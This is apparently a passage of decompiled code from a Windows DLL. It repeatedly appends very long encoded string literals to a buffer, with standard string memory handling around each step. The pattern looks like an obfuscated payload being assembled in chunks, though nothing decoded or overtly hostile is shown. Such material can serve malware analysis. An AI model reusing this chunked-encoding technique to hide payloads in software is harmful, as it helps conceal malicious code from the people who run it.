str.ICHXBhtz1tSfVV4tt_NgKPKSjvPaamVC3BJBPGJI_t0WwdMjQS69BFlNPBFmWlBQjUe7FUUl5lB_dMHSGy3qnQRK7dNlNPZtbTs1Byd2twRK1Ct9TKf0TLobWrYW3oYXTcg3NDeLMCnTTv_ac1nTEEbMCzcA9ERG0dz_LMoXTeduNDcA_HSGhXpLr3hSVd8gLANzdTHfNydDHUDE1Bt94KIAdbArWrromJXZEEbscevHMOFx0T9TvwyCME3_W7Z1pV3N2FCUe2H8U15ltXogHxiKjb4mHvbNAKaicS9xgjFew3JLo8mAtjUgLFaJMCmfLydRvzRKN7zcIPBFXVzkQjSW2lU1CtN95ApdfYbUrMiPkHTIE5w_gEM9HxOgrI3ysAnRZ5lRMuLMCHXBhtjtQRy3BpBHLxFXXXVDyfYa5HbEXpF3GPMdTEWwfsjY4KemRbm2C_HMRVBlNTPoYWcX7WmTcAObqfKXt3HjfbEXpFtXMkVWbQjSWmVyU98REBfJ2hdKyXt3HsgWcX6icBMwbnTLG_hXGuLp5iOicBMoHDtJX_gXGnnw7lYZ83MkVVpcQj_SemVyGARlNIzuhBryXN3HrazfpS03TTKtNhYy3N3HoA2cX5ntXskVSDgQiHSSmVyoXhvKrxEURHXBhtztQ12fdUhEAczvXDXSvgXGmFxrV5l9VMkVT3fNhtztjaWtUhEBeJMRVyXN3BspWcW2tdb5IcfYaZh_wEFS1CpBFHlme8LfNhtzrwmqzJ8BEBcD9EV6YiZJghbZEXpFvXMkVXndhieQ8o0a1rJ983MkfRPpQj9g_g3ZlNchEDvHMRVbChTPoAcX5p9VMkVT3fNhtzqMy2bd8REBflb9NmyXt3HsgWcX6icBMwhBC2CfhXGuge9RSicBMoVf_GW_gXGnn6GW4w83MkVX6TQj_SemVyjDCay4_JNyfsg1t3HkTZGXpFw9bBnzTXFhtzvzV2dfTLMjeLMRVy3t3HsoecXbucBMwRvkfyzeUemVy4pllNLZEURF31T9Tvw12de8FhGDBERVSb4nGmEhWq_uv3MkVbgaZh_YcmVq3lpBB_9B_HlahXt3HiqKVV4OcBMgDLgaZh_ScmVyBUEXJLZEURFeZMCs_y12dVrkQBMgW5fQ7QXGmHbEXpFfLTEbfKSAmobsy12_Bbk2JcAdTESyfa7_MCtqpkg2zfGdTFtgnfae7LbEKWicVCtDTFew3I05psrPeasdiGy_mQ5td2S1EfbADnkcVBgKTFew0o0uKFGvNUgU75FNvYbJWzCPkHqiBkVK7xNEsa_afWC10KYlLdjvXpntFw5Tr4mWWu99G_ucVCJMBqZB1grqEFS1BMCmmEH3lobJWjaeybTIDkCEGry_nQ5y3oUQQ1r2ZlNPZtEjOfL1havwQ19TplNLZ1Eqo1Ob_YeybbEEmicVClczFew3I0nioD5d8gU5zwis7fN1jnFyVfPhsCZb5FErArJT1c0hXZEDnscQzHMFaZj9TVQQ1bNcgU_ZtEjefL1hQvzQ1hdfEALxFErgbdfgWWf7KVV7ucVCNebGfoz3acybTEDlB7DcA9EQ5IY_wAMoXMtcgC_BFEvomQj_SeyaVzaGa9Vpnc7ArJcEDNyrZEDnscQTHMFZLOz9T_yw1Ut8QU4EE5vjVB1jae06VEDmqaDcA9HQ5jQ1TPsoXMpFML5FErArJRjNOgjTIDlXOEy_nQ5y3pUQQ1pI9lNLZNEvb0FuzSeyaSPV5ltXpnlzFG2b4mWa4wFPvucVCJMHqZB1h9lUFShDsC5VJn9EQ5AizeBMoXMtcgF_BFEg2UQj_SeybokF5ltUJnm3lTprQWWcgXTpkgU10udTGPL1jSSyaBYNiTv3Jn_HRxhXo08nFSVd8gU20wis6fJ1hWVQQ1XtcgU7Z1EpO4v__YeybbEEGicVA0jDFew3o0aSdSVd8gUwCidTHfD1jjTIPv1CsCQHVs07obJbYWLYYXMpXvNDeBAFZcrxYavzQ1LmFv37xFErgb\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437c9;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437c9:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str.dTESz6N3_kFSVdWifbxbZXjVMScatTpyGNUWHH6LlmydjvOfdsgOcVYyfLTsJXjVm3bYxqm9NKGaB_fHMRUe929TPsgWcRotvzJaZzBeCrqTMcTxVV5l83MkTU1QQj_rgX3kd98hEACyc6hyXN3Braz7NQAvgvBnzLXFhtrhPO8SMHkcBM4bVteQr4nGnk3kARh83MkRQguQjSWmViW98hEAcJSs6hw3N3DlyWkhXkcBMwD5heQr4nGnElyY8683MkQaGfQj_SemVmpE2ay_ZsUQVcg1N3CkbTIXpRC8B5dboaZgvYemVi3hpBDNhS86hCrZWkFBTVRbu43LvnnVHhszdsKWBQEty9fMuf0WyfsbtxlaHdcVJHJDSkSy09zawnfPe8ttdvAdTFeCrQmQcoPIhru5XJARV2y2N3HqmzNaGa83K3oPReQvgWhWlDVV5W9HJMI6ZB0hHEFS7RGJ8HmBMEaRzD9Tf_9TVV5ltUJ3oNYM0r4WSdfuVV7kQUDMGmXOBrQeSYYXInUbNDeBOEZuQsQjvwQl2fuay7ZNAld9uIzYczaltJPNr5VArArNaXflPZECng90MZNLwQIn7Y_wRRmzjseHLHE3BdjFnQxzskvpkgQ8asdTGfJ0hZvwwlbip8tLZ1Agiqb3YezbXlip_jXYAdTEfyf4WPY803BIg81FBdv84wcYJSKqVECkAgDcAzZZOKjXYczaltHWv5d4Dv_C3RLYeScAnIiZbxLJrMEZyy3okvzQlxYgvMbxFArSdNiXqDkFSVR_u9XIDu1fXDnqUWABRmzjmzQ52nvYbNVryPkHTICnEHHOltFQpRr4WSSdYqqHkQUCm03YKyXIkf3qYJhckv81MC0QacaUezaqjV5l9Vp3cvAzNTiSUzZa1BMSZjaczrArNcpppfrZECmNtrH_igKMA8iiMfYWAJkDdb4DOLwFQHZ4wDSSkhsS2u4AdYnBUNt6tQwlor_dvbI_RqUk9ZQ9IC7UNcoQ7xNAsa_g9VWtxQl1BMSAeTMSbArNQKA8n3ZECng90MHRvg4ALZfaA3fyXqlNDcAPLoFUnbYTVkb3iVFebxzXXjVoWKQ8gnbCXptYXLmXndrm9g_gnZjJkg3BHdTEWy3q_hoIuVV4hv2oYSEpCQj9cukxTVV5Y90sAdT7ajT9TPnxKpV5lO7O9dDFef8OiPkFd0PxkNDfHMBk0Yj9TvzR6htXvyrZFXcdQQj_Se2mNVV5ltUIoD5jfvPgW3oMrVV4Ocdd6_HSKXqzYMgXtd8Q1JaNOiSZBxvvkFSlDNFOFxFVVzXBx_Se2HK6aGatUIgGkbTTL4mHj0IqicS8GSDFew3JLWpXlg98QLGAdT5_fNyddrp5uPht9Lb5FbXnTASfSS1m5UFPJfL5EUREayXJLesoXddUw1LxNXdm0j8GsekKK7UaVNDfpbs6hvfgWJt3BVV7kQS9aUrbRg1pLMcoXTZFMr5FbYklXj9TvzRKBNQMILZ1bWDU67O62rtqpkgHCWUdTHmgFiC8AnfQ15aHSBMBmE18CsvzR6wVEOSLZNXaxEXNTSS2nd822a83IgIUpeQv42Hk_ZGH6S1fbqcbgLYlQWHmzbEH7kQRdbKnp4w0pzqB4fYZkg1HgAdTGPJ984e6EB3BuFtXLgWXyhvb4m3motpaGicS8ncDFeg1pLN4A_TV0OcS8x_HRGw3pLfV6tqt8QLEYcSDHVByfYe6HZEH7ucR_ovdChvXtQ5vmupF5lCSLxdTFRxr5TPkG7d6Cay_BFbUHJQj8btx12dZ8ILCeBMClBLz9TvzRKRm9oNPBFlYvFQj84e6E83BuFjJag1ZHfN9_M4wRSkhtNC_oAdboTasiy_6tU3AtNtUIoO5FQQvgWHgWTVV7kcRe2Ws6hw0pzaI6pqhrueRdE_nR2yWqztQxKvTWpyshEdukfyfwbtR12NRbm8Gddtv2SAmwbva0SvRM5y8jHMRV2b6JTPoYWcXKgMzcARvHXBhtjQV2dfEsNDe4MBGJ\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437cf;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437cf:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str.wLlfQj_l0K1w3svtNTcA_rzeQz9T1swqqHuxI9aVDFeqwCtwb7qR2ZlNN41i86hhbrbP0FSQRllNFyF_TBeQkvau8lTVV7ksb8BdTGvScCsv_TaVF5lUWgRdfbbwj5TPtNCVV7kgbcBdTHEDMXXv_TSVF5lYzD18brbwj5TPsrX3V9lNNinchycfW_k7WP19lNI61DFeq_iuwb6V0M5kNDe_FzFeDrIXGgE50M5kNDdH_LTOQz9ThmQbx3qkkacBdTFYw7LDP0FSI_B8Sra15TBeQmm07zV0N5kNDc8YTFeybLTP0FSor9O_ubpdvufqzvas8FTVV4OsbcBdTE1y7rTP0FS1NvlNTcAAr1eQr7WvkBSVc2Sy8iBwLFfQj91UNSktvtNTcA7iheQr7mtkBSVb3SfifR0LlfQjSk8lTVV5ov7KIdDFezzMTPYjb2NZkNDeBwLlfQj8SnUJSEdXovDYAdbrLwj5TPsrfxV9lNN_KxshDrSjhjQpVV6M6sv_ivbbyj5TPiO3VV7kub8BdTFSPJtktczaVF5ljL6I_bmpo4fg8WBnlLRmvaKIdDFeg5rbP0FSRdXovDYAdca_afXrP0FSVYMN_3BnDTXz7dSPkHT4NZkNDdGUy53ybLbP0FSbq9qcO4b9eQgJJ4EFSWtsCyMj__vIWw_sDPEFSFAA6amxdtv2SCrYPGkkHAwkkYHZVNGcfFXfeUmWiHdJJDYAdfYbiqFSPkGVEJJimzcAObq8hXqDLzhSVRLuxXIzioiHD9Tf_xy6V5lizHedTHm2_pTPvgdY15lD8YP8WZVQj_SwL0MVV5qsHYLdTHfvJ0_PkFd0SltNDeBi4AnQj9culNXVV4kD8IP8UdTQj9ozk7Wil5lNLbaudeQjDXuEFSVWWSO7JJeDFehXozpBtSVTUgVDCJMFHmwYHzEcAXNSuZy8iLOFGpo4fWLgNalLRmvWJgtFwSL4mXp03Wl6icV_gtTFeyXI7yaB5n4MN_3BnDfXD1eSUyla1CsNMSoJdbobKrQWXgDZG06NFI7injXBDcbyZlJo9DpYr_inBdt9Z0wb6tkhsNxkEAdfAzKjfSSymxH1Zl83JgOqVeQr4WXmMlVV7kQVeBRTQ2w3ozlTitqt8QVAfJc1kayXoztRQ6HNUrPNIVDFeA7Sm15usqqGicV8xJTFeg1o7MsAXPU9KNDeBAFklpz1WQQyYzplNLxFFbxSgv6yPMgfNTUgVAKJMFHfN18iHqJQ3hsFv3JonXZTQjUeyG3F5lfLzY9EQxBza_sAnNXCVtveLMFG2HU2twYYXNdLQNDdI_snVB18ftYLfWd7seVeBAFHiyTxTtQQy3BvJ83KAdC1eQoeIdSl9lDPlOPZt9TXdN79SQQ6C_BlNLxNHca_afWC10KYlLdjvXpo9HQ2SmBTPoA3PV0OcV8x_HQ2w0o7d0rIVZkgVGlkdTGfJ19ctQQy2FKljAjFUHLXD1_YcyGltJPML5VFbobIrJf_oCzVtcoVLZ1Fa6CrNnYayHZGDaNpasAdbqWyXrTdsgP5V2tN_6JOJmZB1_l7EFS1CsFlaQpdrATIot3lRDTID7SUZxT_nQy3rrQQy205lNLZ1FQDq5FXSSyHs8fgPv3JgObg6Zlfae_0a2BvNfL5FtfYbIiCpPkHTED5LWzcAHnQfLYWXsoXNdNpdL5NFbArIu3SOEDZED7sca_HMKVZxT9T_yzGXN8ooFfq6tHfN6sw1N6ykhsNPWQAdfA7Ki_SSynxKfJZ9VJoc7ArKiombqiVEM4DETcA9HTOv4xTPoA_xU7kQadynDRehXrXH69SVd8osKVucH7fN7v11UcdkhvpUTIAdfAzzi_SS83q1VRl83Jgm69eQv4XkfZED6k1DGJMFHfD19KBegf1BsF71L_irArIlxLnwyVEN6KQjcA9HzehXKDkoA31VXkQbfG38LdhXrbLfFSVTUgvG2JMLnfN7dnT35S3hv9vXMkFXnXPhsLdswXsRbscBNQ_nTW\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437d5;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437d5:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str._HV6cr4nGnHRfVOmv3MkRbgaZgUemUSqKaDYPAEUfIyzE2UemVqzHgWfBEUXmcLiEQV2ZSkQNDeBARVuLfT9OsAWcW5vQjcA9HV6cvNXPkHTIXpVLGavcboaZg_aemVi3hJBDLxEUXFtirZZQV2ZUwwNDeBMRVuX8RTPsoWcW7oOLcDvLgSZg_SSmVidRZoNLxEUQHXBhtjtQ12HdVhEATIzRQX0BvadEWVEXpVZd0AdboSZgk32qYhLdm_vbpcLgSZg_ScmVifIpsPLZ0UQGH_zZbtQV2ZdchEAdI9vV2gfOf8gnbCXptfL50USEJCry_bsrWcc5lNDeLwRXWQj9Td8qK3BpBBLyEUbFeQj_aSmV63BpBFHLjNnrWMCsdspX85VlNPBEUXnSdz9TQV2GXzINDdI8PErOfgXGgH81l5ljoXuaK7nirE428AWcR7j28j_9HV6At_APkE5EXolVb5EUXHfNhsTa4k0VZkhEH9u0DFew3N3duFhOBrkQBNIN1g6BvgXGgVGqV5ltUMkMVvFZAfSSmUWhvpNDLxEUXXVBhsbtQV2Fbb0w8n_PbhbVPRTPgXZkxbu53LunnVHhszdsomcTYtt_NQKnmhovOf8gnbCXptYXLmXndrm8btZi6vkeay_BFnYnnQjUe60OHF5lB_eJMMGZBxeJWEFS1CtNmbqStrArau_VUrLTIHZyC8cw_nR2qr80wb6VEHZ5FjcAHnx2dLYeFg3ZheY4dXuu_nx2DrSYyaDqmJKpPbqc7gLarQeFraz7RP043BnzPXFxfSS2lcVVRl83IoiPdeQr4eFsqCPHGkUR8QtFR2Tr4eFjgn1oXkQR88arGlhXp7CCFSVdUoHMDhXvuPqzyZ_6hU3BNNtUIos79fQvgWFiaEVV4OcR94_HR2w3J7T2FeqJ8IHDOBABmlt5cQS2VwhlNLZFkVkRvcDSS6WXlKmNtULk2lVWVfgW3oZdVV6kWdcG9Hyu6OfjIA3tVLkQdfvmb0yw0qzFowc8JkgHHiGdTHfNxetrk0s1BtNsiEAdbobarJffkKb3BNNfbzK9HR2SNGswcAnfZh8dMOLMBkayXq3tRSy3BpBFN58c6hCrQPGiEa1po1afTMubgSZjcGbRYa3rItt9tA_kxhXp7DvFSVZkgGMLDdTEWyWJ7hqeKVV5YFTkAdT7aIT5TPnyghF5lO7P_dTFef9mLPkFd0bRlNDc9te5eQjDXzUBSVWNixjcAerSCQz9TQSipkllNHJKRV2g1qjMMAnpaFaN83HMAl7ED9TVQRqRNcgDI99efZw0pr0ddcVZkgBHbJdTGfJw9dvzRi3ZdQYbZFRQ4yvcDSS3EJCN1rtUIwpluyK_gWFm3aVV7ueR_3lPC0R7YGFsAXfSCPy8iBABlsGJY4vzR6hcKLbZ1XTeRGaUe2G2RF5ltXIgqHmhvVQWHiPbEH7kcRcHwzFew3pzOA2tqt8QFPcBs87VBx8XtQx6EdUgBLxVTboTsrYXGmG6LhSay4_AqjFeq8qtwb7qp49lNN7ri86hhXpzwYNSVdUoFIj_h_ktd6S1ELbAH7keRd0sbB1w0pzk8nSfpkgHJe1dTHfDxcn2jVw1CtNtKR4V7obarQWHql4lKCav8FtT7abj5TPvlzW15l3aXis6ZBxeGV0FS7YUPxCvBGBlSg1J7OMAnfbdjmPmBABm3RIOdQRqp3ZlNPZtTTXVDwek32qYhLdm_rzXtNhYy3JrvzRqnT1kNPBFRY__QjSW3FRlDtVOrZ1RYDWOHyUe2HMOV5ltXogjsqhL74WHjZOVV7kQRdj4DcwyXpztQRi3htdv3Io_HV6Yter_r6tHdW9fLLAATvmRc1TPqigqKGajJrudTFj79FTPjUkvLYy8jHMBmvmD9T_yR6VzUgHBaJMBnfBxfrIEFS3htNuTtAzXzPjYXac2nTIHZId2sBsnRf7VTPsofdamEH_3RnDKUg9ZWtwxy1BNF5YI6hrArYvWH8jDTEH7reMj_9ER\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437db;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437db:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str.MRU59FTPsoWcT5m9L5EUVHfNhsz4hhUVdUhEFeJMRVuybqjPkFSEdXgzDcAdXzVDz_YcmU23BpBHHaLMDnXBhtz1qB4VV4kv3IIOTKmrfXPkG7h6Cay_BEUVmJOD9ThqDRWmAtuUqgtFV6KjLSSmU6Rb4_O_CFjTFeQnRPkHZ2KZlNDf3lIn16JX5_6tR3MudNDcA_rymQj9TyaCTv1jsoc8AdTHfx8dTPkF8xV5ltYL4dTFee69TPoYWcT66LjcAHnV6IgPaemUy1CpBVMDNdTGZx89TPkHliV5lX7LwdTFeMrbWzkFSVd_gxDcAdSYiQj_Su7FSVV4faDcA9ISuQj9T_o2VdXgxDcAdboaZl8XtcSqVV5lv2MkHdlftMKscSiVV5lLzwAdbqWKbqjPkFSL9fgxDcAdVrbsj9TPmLb0K5lNDeBwMFeQj8JAvhS3tuVNDcATvAtWRSbhmxSVV4tuUqg_uBR9f81zeoa2CPFfLo8IvYaZlvi90FS7UHg32aBORU6vJl4FsoecTqS1fbqcbgKZlvSSmU2h_OoNPCFjTFeQlFXPkE50KZlNDdB_LSmQj9ThmQbx3rkuc8AdTHY_XJLv_SqVV5lrdAsorDruj9TPj4KNJGicBNgeN9eQv43GiFX1CpBVNrNZTGZx89TPkFVml5ltbrwdTFe3At2csrfpV5lNMDhXvuPqzyZ_6hR3NOVNDcA9ISuQj9TCroDYY_IxDcAdbDrsj9TPkNyEbusccAdTHVBhszesrXrV5lNLxUUVW2lsuuwYYWcTLL9zcAPbgiZhfScmU5hnZfLzw9HV6LrhxPkE5EXoJY75EUV3fNhs_W2Bk7ZngzDcAdeLwQj84u7lSVV5avbL4dTFeg5KrPkFSVt_gzDcAdV46Qj_Su7lSVV5238j_9ISmQj9T_GJUVZkhEFf3SDFew3t3Xqf4VV7kcBNgbyWhvb4nGiHsQqia83MkHc3JQj_SSmU6No80ULZMUVms1BEfvzV2PamzS1vHMRU6UghTPsAWcTpoQzcA9HV6JmUyPkHTIXoBQjgBdfbbsj9TPszJVV6kmccAdTFaw7qjPkFSiy1lNOalhTFeQr7mzkFSVYnXKxaBwMFeQjqd15z3tOVNDcA_nV6JjSbtQV2PRrueBNgMbrbuj9TPsoGcTJu_L5MURHVjNdJqr6t7WH5NDfp18qhvfjWzkFSVRgDNDeB8MFeQj8DDL6t1OuVNDcA0stqUL7WzkFSVbVAy8iB8MFeQj_U276t1OuVNDcA3lyUr_gXGilD15lX3MkHW_XBhs7vzV2PWGPCzfHMRUIFtTPsAecT6G3vPe9EV6IuSV9JV0KZlNDc4dDFew4qrPkFSUNTPKLa1jTFeQpzjml3Z0KZlNDeLMRUBrQXGinZwK5lNDfogsOjvfgXGiXFvF5ltXMkEaWNQj_YzoA2cTp1X3MkEQjXBhs3vzV2MRkMoinH8MFeQjU0FSlPOVNDcAdvD7sj9TPkc50K5lNDdb_LSuQj9Tv8yiVV5lYXC5hLDrsj9TPmvL5a2icBNsZNVeQr4XGi169l5l9VskGSHfBhs_1atqt8REFuSTsuhhXt3XkTBVV7kcBNg6vZeQu43GiHTIXoFdIICdfbbuj9TPmAWVV6kkc8AdTFdw7qrPkFSK4Say1yFjTFeQkrau7lSVV7kgc8AdTFhtthTtcyqVV5lv3MkFXXVDhs_esrXpV5lNLxUUVVVinfeemUqHdchEBJORVyfG7WNOtqualojcAnNnvcDrOVRSVbeBzcj_srSuQj9TFNZSVZ_IxDcAdT3f989TPkGzmHQGtYLwdTFeAF8XcrXpV5lNN9W7MhDbuT98a3oaNkR3_in3TD58ftYLZgxfusjQsnV6KnxTPkHZEXoN9dcE_HV6KofMLKV71CpBXHEKdTGZx8dTPkHE_V5l9Zr4dTFeTL7exkFSVf_Kv9aBwMleQj8LMcazktuVNDcA5rpeQrTezkFSVamEjBJJ5xV1iO66PYuTvFjsuccAdTHf\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437e1;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437e1:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str.dvufqznacwbTIBnl6TkAsnRhEN5TPsAfajIUd1mBAA7z4jQgvzRt4MQqKfBFQhffQj_Se3ZcW6Ga9Vo3c7AbdRviwb7TIGkRPcIDsnRlwhhTPsAXbkQXy8jBGApaw3pommBSVd8QD2zpfCGZBxRvVUFS1BtOBQn_irAraW3aZ5fTEHXQlMj__nx1td549JC7VpSk3TGJOBrfNxT__CRS3htOvXMkHbobcXPaSmUy3BpBbLxFTrgaZm_Ye3bbEXotv3I__HV6erQWecgWcXbucRhE_nx5BrQWIcoHFtUoF75EURG2tquwQnZrRbmzMgP8TJfQj_r2cRSVbeOycj_snRtnO9TPgnfBlakUQQJ9ERttNT1P4YXEl8KNDfRGHbfN3jlT0tSkhtG2uwAdbATYdNcFtnTEH2RnDcA9ER9C6B3poYXSiK_NDdrMC4ay3pM_yxNXdUgK7oMtfC_QLYeIYA_Sk7kQSgEeTZeyXpMtwV2FdVnvXMkTbobYbYXGnHZEBkpvzSLOALXBht7dsgucX6Nohz_irquvvMPkFv0UFlNENUnHCjvcCUe16WuF5lfLzPtFxBTe4ISoXSmnscSiBMC7tbsCsvzRNx7Ocy_BFVqUnQj_Se2KL7aGav3IjdvHXBxzSS2IyRltlcLxFVroLXddDgLtGdP5EJcAdTHVhHbYZVEb3i19fbx7VXzVMRcataIPlpItvWskfXnXPhtLawnZuRbm2GdI_su2FOytwYYXpdEfNDfHMMXpHT9TDYHbEKaicR9tETFew3p7p2atqjUgHEKJMBnfDxeew6DI1CtNguDtivYbWioTPkGTMEZhtXoYl9DYh_4Jk_TIEanzYA_nRGyXp71tVRqqGicR8NWjFeKXp7QMgXfebGAAky9HR2nSswYA3fVLueR_3lBqUk9ZQ9IC7U9coHLZ1XdVgrDUe1kRil5ltXoYqtIqb4WJnACqqEOcS8_HRGw0pL2iK1SJkg0B_HdTE1B9tYtwS27UHg32aLONWpo_65PcgHsd8Q0MwFfzGZB98FrEFSlDuFP7ZFlfCwvcDSS6GeuM5hv3Lg_nS6BrQWJsoHfbam5Mr_snS2sBRTPsAXvTicNDeLrYmFw4YlvzS650xsNPBFlXJlQj_SS6GGcAA9tULgvjSb_1Qe3ibbGL7kcdcfVc6hw0qzk6g9NJkg0OqKdTGfJ9tdvzS2LGnTFvBFXSLlQj_Se2nYuqGatUIo79QgwrQeFrazlLRgvWIo9Hx2He4OY8AnfaCe6WrHMCnnUD9TdsgucXbkcS8Vts6hg1JLOcAXTeBAy8